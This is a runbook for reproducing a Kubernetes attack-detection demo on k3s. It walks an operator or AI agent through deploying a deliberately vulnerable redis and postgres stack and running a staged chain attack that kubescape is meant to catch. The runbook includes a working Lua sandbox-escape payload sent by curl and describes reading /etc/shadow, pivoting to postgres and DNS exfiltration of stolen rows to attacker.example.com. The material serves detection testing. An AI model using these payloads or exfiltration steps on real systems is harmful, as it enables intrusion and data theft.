# Runbook — running the chain demo on your own k3s

**Audience**: an AI agent (or human operator) with shell + kubectl access
to a fresh-ish Linux box. No prior context with this repo.

**Goal**: reproduce the chain attack demo end-to-end and verify the
coverage table reports `4 / 7 expected detections matched`. Time budget:
~25 min wall (including k3s install + image pulls), ~10 min if k3s
+ kubescape are already running.

**Idempotency**: every step is safe to repeat. If something fails you
can re-run that single step. The script's `--teardown` flag resets the
demo's own namespace without touching the cluster's shared infra
(kubescape, alertmanager). For absolute clean-slate, see "Cleanup" at
the end.

---

## Required tools (verify, don't reinstall if present)

```bash
for tool in kubectl jq curl uuidgen; do
  command -v "$tool" >/dev/null && echo "  $tool: $(command -v $tool)" || { echo "MISSING: $tool"; exit 1; }
done
```

If any are missing on a Debian/Ubuntu box:
```bash
sudo apt-get update && sudo apt-get install -y kubectl jq curl uuid-runtime
```

`docker` is **optional** — only required if you want to build images
locally. The default-recommended path uses pre-published GHCR images
and needs no docker. Skip directly to step 4 if you don't have docker.

---

## Step 1 — Cluster: k3s (skip if you already have one running)

Install k3s with the containerd snapshotter that kubescape's eBPF needs:

```bash
curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC="--write-kubeconfig-mode=644" sh -
mkdir -p ~/.kube && sudo cp /etc/rancher/k3s/k3s.yaml ~/.kube/config
sudo chown $(id -u):$(id -g) ~/.kube/config
sed -i "s|server: https://127.0.0.1:6443|server: https://$(hostname -I | awk '{print $1}'):6443|" ~/.kube/config

# Verify
kubectl get nodes  # expect a single Ready node
```

---

## Step 2 — Kubescape (skip if `honey` namespace already exists)

The chain demo requires kubescape's node-agent + storage + alertmanager
deployed in a namespace called `honey`. Easiest way: clone this repo
and run the helper script that the rest of the project uses:

```bash
git clone -b feat/postgres-endpoint-attacks https://github.com/k8sstormcenter/bob.git
cd bob

# Bring kubescape + alertmanager up. The webapp app is the smallest;
# we only need its --setup-only phase to leave kubescape installed.
./scripts/local-ci.sh --app webapp --setup-only
```

Verify:
```bash
kubectl get pods -n honey
# expect: alertmanager-..., node-agent-..., storage-... all Running
```

If you can't run that script (no submodule access etc.), install
kubescape manually via its helm chart — see `kubescape/values.yaml`
in this repo for the exact `networkEventsStreaming: disable` setting
the demo's blind-spot narrative assumes.

---

## Step 3 — Clone the demo branch (skip if you did step 2)

```bash
git clone -b feat/postgres-endpoint-attacks https://github.com/k8sstormcenter/bob.git
cd bob
```

---

## Step 4 — Run the demo (RECOMMENDED PATH: published images)

```bash
./scripts/local-ci-chain.sh --use-published
```

This:
1. Pulls `ghcr.io/k8sstormcenter/chain-frontend:latest` + `chain-backend:latest`
   anonymously (public images, no docker, no auth, no credentials).
2. Deploys 4 components (frontend, backend, redis-vulnerable, postgres:16)
   into a new `chain` namespace.
3. Generates benign baseline HTTP traffic so kubescape learns 4 sbobs
   (ApplicationProfile + NetworkNeighborhood per pod).
4. Waits for each AP to be both `kubescape.io/status: completed` AND
   non-empty (auto-retries if kubescape seals an empty profile).
5. Snapshots alertmanager, runs the 4-stage chain attack via `bobctl
   attack`, snapshots alertmanager again.
6. Parses `chain-attacks.yaml`'s expected detections, matches them
   against active alerts, prints a coverage table.

Expected output (last ~15 lines):
```
SCENARIO                              RULE    CONTAINER  COMM    STATUS
s2-escape-sandbox-read-shadow         R0001   redis      cat     DETECTED
s2-escape-sandbox-read-shadow         R0010   redis              DETECTED
s3-pivot-redis-as-pg-client           R0001   redis      bash    DETECTED
s3-pivot-redis-as-pg-client           R0011   redis              BLIND
s4-exfil-to-internet                  R0001   redis      perl    DETECTED
s4-exfil-to-internet                  R0005   redis              BLIND
s4-exfil-to-internet                  R0011   redis              BLIND

Coverage: 4 / 7 expected detections matched
```

The 3 BLIND rows are intentional — see `example/chain/README.md`
section "How to unblind".

### Extended chain (opt-in: real pg-wire + DNS exfil)

```bash
./scripts/local-ci-chain.sh --use-published --extended
```

`--extended` runs two additional stages after the basic chain:

- **s5-pivot-pg-protocol-extract-row** — perl one-liner inside the
  redis Lua sandbox speaks real pg-wire (V3 StartupMessage + Query +
  parse DataRow) and extracts one row from chain-postgres back to the
  redis pod. The HTTP response carries the extracted bytes through the
  frontend (`PG_ROW=<actual-postgres-row>`). Stage 3's SSLRequest-only
  predecessor proved connectivity; s5 proves data moves cross-pod.

- **s6-dns-exfil-of-stolen-row** — same primitive, different sink.
  After extracting the row, perl base32-encodes it and slices into
  30-char DNS labels. One `getent hosts <chunk>.attacker.example.com`
  per chunk. With `networkEventsStreaming: enable` each lookup
  becomes an R0005 alert with the encoded label visible in
  `alert.labels.address` — operators see the leaked bytes in the
  SIEM, not just an anomaly count.

Expected output (extended; 6/12 = same DETECTED set + 2 new R0001
perl detections from s5/s6, all 4 new BLINDs map to the same operator
knobs):

```
SCENARIO                              RULE    CONTAINER  COMM    STATUS
s2-escape-sandbox-read-shadow         R0001   redis      cat     DETECTED
s2-escape-sandbox-read-shadow         R0010   redis              DETECTED
s3-pivot-redis-as-pg-client           R0001   redis      bash    DETECTED
s3-pivot-redis-as-pg-client           R0011   redis              BLIND
s4-exfil-to-internet                  R0001   redis      perl    DETECTED
s4-exfil-to-internet                  R0005   redis              BLIND
s4-exfil-to-internet                  R0011   redis              BLIND
s5-pivot-pg-protocol-extract-row      R0001   redis      perl    DETECTED
s5-pivot-pg-protocol-extract-row      R0011   redis              BLIND
s6-dns-exfil-of-stolen-row            R0001   redis      perl    DETECTED
s6-dns-exfil-of-stolen-row            R0005   redis              BLIND
s6-dns-exfil-of-stolen-row            R0011   redis              BLIND

Coverage: 6 / 12 expected detections matched
```

Requires `chain.yaml` to set `POSTGRES_HOST_AUTH_METHOD=trust` on
chain-postgres (already configured in this branch). The basic chain
still works either way — Stage 3 only sends SSLRequest bytes and
reads the `N` (no SSL) reply, which doesn't depend on auth mode.

### Pinning to a specific build

`:latest` only tracks `main`. To pin to a specific branch SHA (useful
when reproducing a particular CI run):

```bash
# Find the SHA of the commit whose published images you want.
git log --oneline -5 -- example/chain/ scripts/local-ci-chain.sh
# Use the 7-char short-sha as the tag:
CHAIN_PUBLISHED_TAG=af7e67a ./scripts/local-ci-chain.sh --use-published
```

The CI workflow tags every push to `main` / `feat/postgres-endpoint-
attacks` with `<short-sha>` + `<branch>` (and `latest` for main).

---

## Step 4-alt — Run the demo (LOCAL-BUILD PATH, requires docker)

Only needed if you're iterating on the Go services or chain manifests:

```bash
./scripts/local-ci-chain.sh                    # full pipeline, builds + ttl.sh-pushes
./scripts/local-ci-chain.sh --setup-only       # just deploy + learn
./scripts/local-ci-chain.sh --attack-only      # re-run chain against existing deploy
./scripts/local-ci-chain.sh --extended         # also run s5 (pg-wire) + s6 (DNS exfil)
./scripts/local-ci-chain.sh --attack-only --extended  # re-run incl. extended stages
```

The local path builds chain-{frontend,backend} from
`example/chain/{frontend,backend}/`, pushes to ttl.sh (anonymous,
24-hour TTL — no GHCR auth), and substitutes those refs into the
manifest at apply time.

Known docker-credstore quirk on hosts that use pass+gpg-pinentry: the
script scopes a temporary HOME with an empty docker config around its
build/push calls, so the host's pass credstore isn't invoked. You
don't need to do anything; it just works.

---

## Step 5 — Verify each piece independently (when things look off)

### a) Did all 4 pods come up?
```bash
kubectl get pods -n chain
# Expect 4 pods, all 1/1 Running. chain-redis is on the vulnerable
# image (ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10).
```

### b) Are all 4 sbobs sealed and non-empty?
```bash
kubectl get applicationprofile -n chain -o json | \
  jq -r '.items[] | select(.metadata.name | startswith("replicaset-chain-")) |
    "\(.metadata.name)  status=\(.metadata.annotations["kubescape.io/status"])  execs=\(.spec.containers[0].execs|length)"'
# Each app should show status=completed and execs>0.
# (the script's wait loop enforces this — but verify if you ran phases manually)
```

### c) Does the sandbox escape actually work? (manual probe)
```bash
kubectl run probe-$RANDOM --rm -i --restart=Never \
  --image=curlimages/curl:8.10.1 --namespace=chain --quiet -- \
  sh -c 'curl -sf -X POST -H "Content-Type: application/json" --data "@-" \
    http://chain-frontend.chain.svc:8080/api/cache/eval' <<'EOF'
{"script":"local io_mod=nil; pcall(function() if type(io)==\"table\" and io.popen then io_mod=io end end); if not io_mod then return \"sandbox_blocked\" end; local h=io_mod.popen(\"cat /etc/hostname\"); local out=h:read(\"*a\"); h:close(); return out"}
EOF
# Expect: {"reply":"chain-redis-...\n"}
# If you get {"reply":"sandbox_blocked"}: the redis image is the wrong
# variant — chain.yaml must reference ghcr.io/k8sstormcenter/
# redis-vulnerable:7.2.10 specifically. Vanilla redis:7.2 will block.
```

### d) What alerts is alertmanager actually holding for redis right now?
```bash
kubectl get --raw "/api/v1/namespaces/honey/services/alertmanager:9093/proxy/api/v2/alerts?active=true" \
  | jq -r '.[] | select(.labels.container_name == "redis" and ((.labels.pod_name // "") | startswith("chain-"))) |
    "  \(.labels.rule_id) | comm=\(.labels.comm // "?") | starts=\(.startsAt)"'
# After running attacks, expect alerts for R0001 (cat / bash / perl)
# and R0010 (sensitive file).
```

---

## Step 6 — Cleanup

```bash
# Tear down JUST the chain namespace (keeps kubescape + other apps):
./scripts/local-ci-chain.sh --teardown

# Full reset (only if you also installed k3s in step 1):
sudo /usr/local/bin/k3s-uninstall.sh
```

---

## Common failure modes and fixes

| Symptom | Likely cause | Fix |
|---|---|---|
| `Coverage: 0 / 7 matched` or all BLIND | alertmanager hasn't received events yet | re-run `--attack-only` after 30s |
| `Coverage: 1 / 7 matched` (only R0010 fires) | redis AP sealed empty (kubescape race) | the script's retry loop should handle it; if it didn't, `kubectl delete applicationprofile -n chain -l app=chain-redis` + `kubectl rollout restart deployment/chain-redis -n chain` + re-run `--setup-only` |
| `sandbox_blocked` in step 5(c) | wrong redis image | verify `chain.yaml` references `ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10`, not vanilla `redis:7.2` |
| `frontend never became ready` | rolling-update race in the script | `kubectl wait --for=condition=ready pod -l app=chain-frontend -n chain --timeout=120s` manually, then re-run `--attack-only` |
| `kubescape ns (honey) missing` | step 2 not done | run `./scripts/local-ci.sh --setup-only --app webapp` |
| `ImagePullBackOff` for chain-frontend/backend with `--use-published` | The published `:latest` tag was deleted/rebuilt | use `:<short-sha>` instead: `CHAIN_PUBLISHED_TAG=af7e67a ./scripts/local-ci-chain.sh --use-published` |

---

## What "success" means

The terminal output ending with `Coverage: 4 / 7 expected detections matched`
**is** the success criterion. The exact split (which rules DETECTED vs
BLIND) is fixed by the cluster's two operator knobs:

- `networkEventsStreaming: disable` (in `kubescape/values.yaml`) → R0005 + R0011 BLIND
- `R0011.isTriggerAlert: false` (in `kubescape/default-rules.yaml`) → R0011 BLIND

A different cluster with `networkEventsStreaming: enable` and R0011
flipped to `isTriggerAlert: true` would produce `Coverage: 7 / 7`.

Don't try to fix the BLIND rows by editing `chain-attacks.yaml` —
those are the demo's point.
